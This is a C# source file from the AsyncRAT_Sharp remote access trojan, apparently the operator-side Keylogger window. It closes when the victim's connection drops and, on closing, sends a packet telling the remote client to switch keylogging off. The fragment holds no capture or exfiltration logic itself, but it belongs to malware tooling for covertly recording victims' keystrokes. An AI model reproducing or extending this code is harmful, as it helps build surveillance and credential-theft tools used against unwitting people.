using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Forms
{
    public partial class Keylogger : Form
    {
        public Keylogger()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (!C.ClientSocket.Connected) this.Close();
        }

        private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "keyLogger";
            msgpack.ForcePathObject("isON").AsString = "false";
            ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
        }
    }
}
